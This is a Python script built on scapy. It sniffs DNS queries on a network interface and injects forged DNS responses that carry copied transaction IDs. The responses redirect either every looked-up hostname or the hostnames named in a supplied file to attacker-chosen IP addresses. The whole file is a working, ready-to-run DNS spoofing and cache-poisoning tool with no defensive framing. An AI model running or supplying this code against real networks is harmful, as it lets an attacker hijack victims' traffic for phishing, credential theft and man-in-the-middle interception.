from scapy.all import Ether, IP, UDP, DNS, DNSRR, sniff, sendp

import argparse
import os
import socket

parser = argparse.ArgumentParser(description = "[Info] Captures network traffic and attempts to inject forged responses to poison the cache of a victim's resolver.")

parser.add_argument('-i', metavar='interface', help='the network device to listen to')
parser.add_argument('-f', metavar='hostnames', help='a list of IP addresses and hostname pairs specifying the hostnames to be hijacked')
parser.add_argument('expression', help='a BPF filter that specifies a subset of the traffic to be monitored', nargs='?')

args = parser.parse_args()
poison_ips = {}
interface = args.i if args.i else "eth0"

if args.f:
    with open(args.f) as fd:
        for line in fd:
            line = line.strip().split()
            poison_ips[line[1]] = line[0]

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
poison_ip = s.getsockname()[0]
s.close()

def dns_poison(pkt):
    qd = pkt["DNS"].qd
    if qd.qtype != 1: return

    sendp(
        Ether() /
        IP(src=pkt["IP"].dst, dst=pkt["IP"].src) /
        UDP(sport=pkt["UDP"].dport, dport=pkt["UDP"].sport) /
        DNS(id=pkt["DNS"].id, ad=1, ra=0, qr=1, aa=1, ancount=1, qd=qd, an=DNSRR(
            rrname=bytes(bytearray.fromhex("c00c")),
            type="A",
            ttl=5, 
            rdata=poison_ip)
        ), 
    iface=interface, verbose=0)

def dns_poisonf(pkt):
    qd = pkt["DNS"].qd
    if qd.qtype != 1: return

    qname = qd.qname[:-1].decode('utf-8')
    if qname not in poison_ips: return

    sendp(
        Ether() /
        IP(src=pkt["IP"].dst, dst=pkt["IP"].src) /
        UDP(sport=pkt["UDP"].dport, dport=pkt["UDP"].sport) /
        DNS(id=pkt["DNS"].id, ad=1, ra=0, qr=1, aa=1, ancount=1, qd=qd, an=DNSRR(
            rrname=bytes(bytearray.fromhex("c00c")),
            type="A",
            ttl=5,
            rdata=poison_ips[qname])
        ), 
    iface=interface, verbose=0)

bpf_filter = str.lower(args.expression) if args.expression else "udp dst port 53"
sniff(iface = interface, filter=bpf_filter, prn=dns_poisonf if poison_ips else dns_poison, store=0)